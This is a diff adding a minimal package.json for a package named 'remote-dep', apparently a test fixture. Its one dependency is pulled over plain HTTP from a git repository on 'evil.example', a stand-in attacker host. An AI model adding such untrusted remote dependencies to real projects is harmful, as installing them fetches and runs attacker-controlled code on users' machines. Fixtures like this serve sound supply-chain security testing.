@@ -1,0 +1,7 @@
+{
+  "name": "remote-dep",
+  "version": "0.0.1",
+  "dependencies": {
+    "helper": "git+http://evil.example/helper.git"
+  }
+}
